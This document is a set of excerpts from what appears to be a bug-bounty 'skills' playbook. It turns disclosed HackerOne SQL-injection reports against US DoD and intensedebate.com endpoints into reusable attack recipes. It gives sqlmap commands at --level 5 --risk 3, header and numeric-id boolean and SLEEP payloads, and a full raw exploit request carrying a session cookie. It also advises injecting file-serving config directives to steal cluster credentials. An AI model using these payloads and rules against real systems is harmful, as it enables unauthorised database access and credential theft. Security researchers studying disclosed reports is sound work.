WHY IT IS A NEW GENERAL METHOD: the playbook's three ingress-nginx entries all end in CODE EXECUTION — §17.172 (snippet annotation + Lua), §17.178 (`path` + `log_format`/`access_log` + `include`), §17.179 (the `permanent-redirect` annotation + Lua) — and this file's LFI material is path traversal / log poisoning. Nothing records the cheap version: the same injection point, but the injected directive only SERVES A FILE, which is enough because the served file is a cluster credential and the escalation comes from the victim's RBAC, not from code execution. Reusable rule: **when you find a config-injection point, inject a file-serving directive before you bother with a code directive — "what credential files can this process read?" is the shortest path to impact.** Slot 17.181.

### [Bugbountyskills.md] 17.301 HTTP request headers (User-Agent / Referer / X-Forwarded-For) are SQLi injection points — find them with sqlmap --level 5 --risk 3 and a boolean-pair diff

SOURCE: HackerOne #2597543 — U.S. Dept Of Defense, "Blind Sql Injection in https://████" (SQL Injection, Medium, disclosed 2024-08-29, reporter iamunixtz)  read 2026-11-09
CLASS: SQL injection, boolean-based blind (CWE-89) — the sink is an HTTP header, not a parameter.
CORE METHOD:
  1. Entry point: the User-Agent HTTP header. Verbatim: "A SQL injection vulnerability was discovered in the User-Agent parameter of the website `https://██████████/`."
  2. Discovery: `sqlmap --url "https://█████████/" --batch --random-agent --level 5 --risk 3` — `--level 5 --risk 3` is what makes sqlmap test HEADER parameters, not just query/body.
  3. Injection point, verbatim: "Parameter: User-Agent (User-Agent) / Type: boolean-based blind / Title: OR boolean-based blind - WHERE or HAVING clause / Payload: -5127 OR 2687=2687".
  4. Backend: "MySQL >= 8.0.0, MariaDB fork".
DETECTION SIGNAL: parameter/cookie fuzzing is clean but the app logs or behaves as if header values reach a query; sqlmap names a HEADER parameter (User-Agent / Referer / X-Forwarded-For / X-Real-IP) as injectable; a boolean-pair differential (true vs false payloads change the response). User-Agent is often logged into a `user_agent` column or used in a `WHERE ua = '...'` lookup, so scanners stuck at `--level 1` miss it.
CHAIN: any visitor (the header is client-controlled by definition) -> the app concatenates the User-Agent into SQL -> boolean-based blind SQLi (one bit per request) -> arbitrary SQL on the backend DB -> data read/manipulation and, per the report, "complete compromise of the database server".
TRANSFERABLE TEST: run `sqlmap --url "<target>/" --batch --level 5 --risk 3`, OR manually diff a boolean pair whose ONLY difference is the header — `User-Agent: -5127 OR 2687=2687` vs `-5127 OR 2687=2688` — and repeat across Referer, X-Forwarded-For, X-Real-IP and custom `X-*` headers. Rule: **headers are SQLi sinks — when parameter fuzzing is clean, raise sqlmap to `--level 5 --risk 3` and diff a boolean-pair payload in every request header.**

### [Bugbountyskills.md] 17.305 A TIME-BASED BLIND SQLi in a numeric account-id query parameter of a legacy PHP install/settings script — prove it with a SLEEP whose delay tracks the argument, then escalate by reading `database()` (Automattic / intensedebate.com, HackerOne #1042746)

SOURCE: https://hackerone.com/reports/1042746 — Automattic "[intensedebate.com] SQL Injection Time Based on /changeReplaceOpt.php" (Critical, reporter `fuzzme`, submitted 2020-11-24, disclosed 2021-01-01)  read 2026-11-09
ROUTE: full reporter body read live this pass on the `.json` route -> HTTP 200, 10,875 B, `vulnerability_information` 1,401 B read IN FULL; `visibility: full`.
STATUS: UNVERIFIED (not reproduced — no intensedebate.com asset was touched; the request, timings and database name are quoted verbatim from the report).
CLASS: SQL injection, TIME-BASED BLIND, in a numeric account-id query parameter (CWE-89; triaged Critical).
CORE METHOD:
  1. ENTRY POINT + PARAMETER, verbatim: "i have found a SQLI Injection Time Based on `https://www.intensedebate.com/changeReplaceOpt.php`. The parameter `$_GET['acctid']` is vulnerable." — a GET parameter named for an ACCOUNT ID, on an `install-t`-referered script, with a session cookie.
  2. THE PROBE, verbatim:
     ```
     GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(15) HTTP/1.1
     Host: www.intensedebate.com
     User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
     Accept: */*
     Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
     Accept-Encoding: gzip, deflate
     Connection: close
     Referer: https://www.intensedebate.com/install-t
     Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
     ```
     Verbatim: "Response time: 15 414 millis." A `SLEEP(7)` run gave verbatim "7 486 millis."
  3. DETECTION FRAMING, verbatim: "I have inject a MySQL function `sleep()`, and it works."
  4. THE FOOTPRINT, verbatim: "database() : id_commxn2s" — `database()` evaluated through the same point, i.e. the sink permits FUNCTION evaluation.
  5. IMPACT, verbatim: "Full database access holding private user information."
DETECTION SIGNAL: a TIME differential that tracks the SLEEP argument (15 s vs 7 s vs baseline) on an endpoint that returns no error and no data. TELL: the parameter is a NUMERIC account id (`acctid`, `userid`, `account_id`, `oid`) in the QUERY STRING of a legacy script — the classic unparameterised sink. COMPANION TELL: a `Referer` of a setup/install script; legacy install scripts are the highest-yield SQLi surface.
CHAIN: any unauthenticated visitor (primitive: no privileged session needed) -> `acctid` is concatenated into a query (primitive: numeric query parameter, unparameterised) -> `AND SLEEP(n)` delays the response by n seconds (primitive: time-based blind, one bit per request) -> `database()` and arbitrary functions evaluate in the sink (escalation: a real expression context) -> full database access (impact: "Full database access holding private user information"; triaged Critical).
TRANSFERABLE TEST: on every numeric-id query parameter of a legacy/PHP/Java endpoint, send `?id=<n> AND SLEEP(10)` and measure against a baseline (and against `SLEEP(3)`); a delay that tracks the argument proves the sink. Then confirm EXPRESSION CONTEXT with `AND IF(1=1,SLEEP(5),0)` or a `database()`-style function read — a delay alone proves the value reaches a query, a function result proves you can read. Rule: **numeric-id query parameters on legacy install/settings scripts are unparameterised SQLi sinks — prove them with a SLEEP whose delay tracks the argument, then escalate by reading `database()`/user data through the same point; no output and no error is expected, so TIMING is the oracle.**

### [Bugbountyskills.md] 17.308 A legacy ColdFusion `.cfm` endpoint's numeric query parameter (`countID`) reaches SQL — confirm it with the DBMS banner returned in-band at sqlmap `--level 3 --risk 3`

SOURCE: HackerOne #390879 — U.S. Dept Of Defense, "SQL Injection on www.██████████ on countID parameter" (SQL Injection, High, reporter `0_1vitthal`, submitted 2018-08-06 / disclosed 2019-10-08; body read IN FULL this pass on the `.json` route, 696-char `vulnerability_information`; UNVERIFIED — not reproduced, no DoD target touched)
CLASS: SQL injection in a NUMERIC-looking QUERY PARAMETER of a legacy ColdFusion endpoint (CWE-89).
METHOD: the entry point is `https://www.███/public/saveCount.cfm?countID=4` — a `.cfm` page under `/public/` taking a single numeric id. The discovery command is verbatim `python sqlmap.py -u https://www.██████████/public/saveCount.cfm?countID=4 --level=3 --risk=3`; the confirmation oracle is the DBMS banner returned in-band, verbatim "Microsoft SQL Server 2008 R2 (SP3) - 10.50.6220.0 (X64 & Mar 19 2015 12:32:14 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)". The reporter's own scope note is verbatim "after confirming the vulnerability i have stopped testing further." — no extraction was performed, so the "control over the database server" line is the reporter's stated impact, not a demonstrated chain.
DETECTION SIGNAL: a legacy/undocumented endpoint with an old script extension (`.cfm`, `.asp`, `.aspx`, `.jsp`, `.php`) taking a single numeric id in the query string; a DBMS error/banner in the response when the numeric value is perturbed; an id parameter with no WAF rule coverage; sqlmap reporting an injection only at `--level 3`/`--risk 3`.
TRANSFERABLE TEST: for every legacy-script endpoint found in recon, send an id-pair whose only difference is the numeric value — `<id>` vs `<id>'` vs `<id> AND 1=1-- -` — and diff status/body/length; then run `sqlmap -u '<URL>' --level=3 --risk=3 --batch` and read whether it reports an injection and which DBMS banner comes back. Rule: **numeric-looking ids on legacy script extensions are untyped query params until proven otherwise — a default sqlmap scan misses them, so raise `--level 3 --risk 3` and diff an id-pair rather than trusting the parameter name.**
DEDUPE: 0 hits across all three write targets for `390879`, `saveCount`, `countID`, `cfm`, `ColdFusion`. Related-but-recorded and NOT re-recorded: §17.301 (the DoD HEADER User-Agent SQLi — a different injection POINT), §17.305 (time-based blind in a numeric `acctid` of a legacy PHP script — same shape, different language/parameter and no banner oracle), the InnoGames URL-PATH time-based entry, the unauthenticated Formidable Pro shortcode SQLi and the Zomato `item_id` WAF bypass. None records a ColdFusion `.cfm` endpoint whose confirmation is the DBMS BANNER returned in-band at `--level 3 --risk 3`.

